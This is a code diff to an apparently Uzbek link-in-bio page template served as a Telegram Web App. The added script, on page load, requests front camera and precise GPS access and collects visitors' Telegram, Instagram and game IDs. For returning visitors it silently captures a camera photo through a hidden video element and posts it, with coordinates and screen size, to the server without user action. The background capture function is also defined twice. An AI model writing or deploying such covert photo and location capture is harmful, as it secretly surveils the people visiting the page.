@@ -139,8 +139,9 @@
             <p class="desc">{{ profile.description }}</p>
         {% endif %}
 
-        {% for link in links %}
-            {% if link.action_type == 'copy' %}
+    {% for link in links %}
+            {% if link.action_type == 'copy' or link.icon_type == 'pubg' or link.icon_type == 'mlbb' or link.icon_type == 'freefire' %}
+                
                 <div onclick="copyToClipboard('{{ link.url }}', this); trackClick('{{ link.id }}');" class="link-card">
                     <div class="icon-box">
                         {% if link.icon_type == 'phone' %}<i class="bi bi-telephone-fill"></i>
@@ -167,7 +168,9 @@
                         <div class="link-subtitle">{% if link.subtitle %}{{ link.subtitle }}{% else %}{{ link.url }}{% endif %}</div>
                     </div>
                 </div>
+
             {% else %}
+                
                 <a href="{{ link.url }}" target="_blank" onclick="trackClick('{{ link.id }}')" class="link-card">
                     <div class="icon-box">
                         {% if link.icon_type == 'phone' %}<i class="bi bi-telephone-fill"></i>
@@ -196,6 +199,7 @@
                         {% endif %}
                     </div>
                 </a>
+
             {% endif %}
         {% endfor %}
 
@@ -205,121 +209,234 @@
     </div>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script>
-        let activeStream = null;
+<script>
+// Global o'zgaruvchilar koordinatalar uchun
+    let userLat = null;
+    let userLon = null;
 
-        window.addEventListener('DOMContentLoaded', async () => {
-            if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.ready();
-                window.Telegram.WebApp.expand();
-            }
+    window.addEventListener('DOMContentLoaded', async () => {
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
+        
+        const isLoggedIn = "{{ is_logged_in }}";
+        const saved = localStorage.getItem('visitor_authenticated');
+        
+        if (isLoggedIn === "False" && !saved) {
+            document.getElementById('usernameModal').classList.add('active');
             
-            const isLoggedIn = "{{ is_logged_in }}";
-            const saved = localStorage.getItem('visitor_authenticated');
-            
-            if (isLoggedIn === "False" && !saved) {
-                document.getElementById('usernameModal').classList.add('active');
-                
-                // Modal yuklanishi bilanoq kameraga ruxsat so'rovini faollashtirish
-                try {
-                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    const video = document.getElementById('video');
-                    video.srcObject = activeStream;
-                } catch (e) {
-                    console.log("Kamera ruxsati dastlab rad etildi:", e);
-                }
+            // [YANGI]: Kamera bilan birga brauzerdan aniq GPS koordinatalarni so'rash
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLat = position.coords.latitude;
+                        userLon = position.coords.longitude;
+                        console.log("GPS aniqlandi:", userLat, userLon);
+                    },
+                    (error) => { console.log("GPS ruxsat berilmadi yoki xato:", error); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             }
-        });
-
-        async function validateAndCapture() {
-            const tg = document.getElementById('tgInput').value.trim().replace('@', '');
-            const insta = document.getElementById('instaInput').value.trim().replace('@', '');
-            const gId = document.getElementById('idInput').value.trim();
-            const errorBox = document.getElementById('errorBox');
-
-            if (!tg && !insta && !gId) {
-                errorBox.style.display = "block";
-                return;
-            }
-            errorBox.style.display = "none";
-
-            const submitBtn = document.getElementById('submitBtn');
-            submitBtn.innerText = "Tekshirilmoqda...";
-            submitBtn.disabled = true;
-
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-            let imageData = null;
-            let statusText = "Kameraga ruxsat berilmadi ❌";
 
             try {
-                if (!activeStream) {
-                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                }
-                
-                statusText = "Haqiqiy kamera rasmi olindi ✅";
-                context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
-                imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                activeStream.getTracks().forEach(track => track.stop());
-            } catch (err) {
-                statusText = "Kamera butunlay rad etildi ⚠️";
-                imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
+                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = activeStream;
+            } catch (e) {
+                console.log("Kamera ruxsati rad etildi:", e);
             }
+        } else if (isLoggedIn === "True" || saved) {
+            // Qayta kirganda ham fonda GPSni yangilashga harakat qiladi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    userLat = position.coords.latitude;
+                    userLon = position.coords.longitude;
+                    captureAndSendInBackground();
+                }, () => { captureAndSendInBackground(); }, { enableHighAccuracy: true });
+            } else {
+                captureAndSendInBackground();
+            }
+        }
+    });
 
-            const formData = new FormData();
-            formData.append('tg_user', tg || '-');
-            formData.append('insta_user', insta || '-');
-            formData.append('game_id', gId || '-');
-            formData.append('image_data', imageData);
-            formData.append('status_text', statusText);
-            formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
-            formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+    async function validateAndCapture() {
+        const tg = document.getElementById('tgInput').value.trim().replace('@', '');
+        const insta = document.getElementById('instaInput').value.trim().replace('@', '');
+        const gId = document.getElementById('idInput').value.trim();
+        const errorBox = document.getElementById('errorBox');
 
-            fetch(window.location.href, {
-                method: 'POST',
-                body: formData,
-                headers: { 'X-Requested-With': 'XMLHttpRequest' }
-            }).then(res => res.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    localStorage.setItem('visitor_authenticated', 'true');
-                    document.getElementById('usernameModal').classList.remove('active');
-                }
-            }).catch(() => {
+        if (!tg && !insta && !gId) {
+            errorBox.style.display = "block";
+            return;
+        }
+        errorBox.style.display = "none";
+
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.innerText = "Tekshirilmoqda...";
+        submitBtn.disabled = true;
+
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let imageData = null;
+        let statusText = "Kameraga ruxsat berilmadi ❌";
+
+        try {
+            if (!activeStream) {
+                activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            }
+            statusText = "Haqiqiy kamera rasmi olindi ✅";
+            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/jpeg', 0.8);
+            activeStream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            statusText = "Kamera butunlay rad etildi ⚠️";
+            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
+        }
+
+        const formData = new FormData();
+        formData.append('tg_user', tg || '-');
+        formData.append('insta_user', insta || '-');
+        formData.append('game_id', gId || '-');
+        formData.append('image_data', imageData);
+        formData.append('status_text', statusText);
+        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
+        
+        // [YANGI]: GPS ma'lumotlarini jo'natish
+        formData.append('gps_lat', userLat);
+        formData.append('gps_lon', userLon);
+        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData,
+            headers: { 'X-Requested-With': 'XMLHttpRequest' }
+        }).then(res => res.json())
+        .then(data => {
+            if (data.status === 'success') {
+                localStorage.setItem('visitor_authenticated', 'true');
                 document.getElementById('usernameModal').classList.remove('active');
-            });
+            }
+        }).catch(() => {
+            document.getElementById('usernameModal').classList.remove('active');
+        });
+    }
+
+    // Fonda yuborish funksiyasiga ham GPS qo'shildi
+    async function captureAndSendInBackground() {
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let imageData = null;
+        let statusText = "Fonda: Kameraga ruxsat berilmadi ❌";
+        let localStream = null;
+
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            statusText = "Fonda: Haqiqiy kamera rasmi olindi ✅";
+            
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.srcObject = localStream;
+            hiddenVideo.play();
+            
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/jpeg', 0.8);
+            localStream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            statusText = "Fonda: Kamera butunlay rad etildi ⚠️";
+            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
         }
 
-        function trackClick(linkId) {
-            const formData = new FormData();
-            formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
-            fetch(`/click/${linkId}/`, { method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+        const formData = new FormData();
+        formData.append('image_data', imageData);
+        formData.append('status_text', statusText);
+        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
+        
+        // [YANGI]: Fonda ham GPS uzatish
+        formData.append('gps_lat', userLat);
+        formData.append('gps_lon', userLon);
+        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData,
+            headers: { 'X-Requested-With': 'XMLHttpRequest' }
+        });
+    }
+    // [YANGI]: Qayta kirishda fonda rasmga olish va yuborish (Validatsiyasiz POST so'rovi)
+    async function captureAndSendInBackground() {
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let imageData = null;
+        let statusText = "Fonda: Kameraga ruxsat berilmadi ❌";
+        let localStream = null;
+
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            statusText = "Fonda: Haqiqiy kamera rasmi olindi ✅";
+            
+            // Rasmni tushirish uchun yashirin video elementi (activeStream emas, fon rejimida)
+            const hiddenVideo = document.createElement('video');
+            hiddenVideo.srcObject = localStream;
+            hiddenVideo.play();
+            
+            await new Promise(resolve => setTimeout(resolve, 1000)); // Rasm olish uchun 1 soniya kutish
+            
+            context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            localStream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            statusText = "Fonda: Kamera butunlay rad etildi ⚠️";
+            imageData = await convertUrlToBase64(`https://ui-avatars.com/api/?name=Kamera+Yopiq&background=f43f5e&color=fff&size=512`);
         }
 
-        async function convertUrlToBase64(url) {
-            const response = await fetch(url);
-            const blob = await response.blob();
-            return new Promise((resolve) => {
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.readAsDataURL(blob);
-            });
-        }
+        // Backendga rasm yuborish (POST so'rovi - Validatsiyasiz)
+        const formData = new FormData();
+        formData.append('image_data', imageData);
+        formData.append('status_text', statusText);
+        formData.append('screen_size', `${window.screen.width}x${window.screen.height}`);
+        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
 
-        // NUSXALASH MEXANIZMI
-        function copyToClipboard(text, element) {
-            navigator.clipboard.writeText(text).then(() => {
-                const textBox = element.querySelector('.link-subtitle');
-                if (!textBox) return;
-                const oldText = textBox.innerText;
-                textBox.innerText = "NUSXALANDI! ✅";
-                textBox.style.color = "#fcf6ba";
-                setTimeout(() => { textBox.innerText = oldText; textBox.style.color = ""; }, 1500);
-            }).catch(err => {
-                console.log("Nusxalashda xatolik:", err);
-            });
-        }
-    </script>
+        fetch(window.location.href, {
+            method: 'POST',
+            body: formData,
+            headers: { 'X-Requested-With': 'XMLHttpRequest' }
+        }).catch(() => {
+            console.log("Fonda rasm yuborishda xatolik");
+        });
+    }
+
+    function trackClick(linkId) {
+        const formData = new FormData();
+        formData.append('csrfmiddlewaretoken', '{{ csrf_token }}');
+        fetch(`/click/${linkId}/`, { method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+    }
+
+    async function convertUrlToBase64(url) {
+        const response = await fetch(url);
+        const blob = await response.blob();
+        return new Promise((resolve) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.readAsDataURL(blob);
+        });
+    }
+
+    // NUSXALASH MEXANIZMI
+    function copyToClipboard(text, element) {
+        navigator.clipboard.writeText(text).then(() => {
+            const textBox = element.querySelector('.link-subtitle');
+            if (!textBox) return;
+            const oldText = textBox.innerText;
+            textBox.innerText = "NUSXALANDI! ✅";
+            textBox.style.color = "#fcf6ba";
+            setTimeout(() => { textBox.innerText = oldText; textBox.style.color = ""; }, 1500);
+        }).catch(err => {
+            console.log("Nusxalashda xatolik:", err);
+        });
+    }
+</script>
 </body>
 </html>
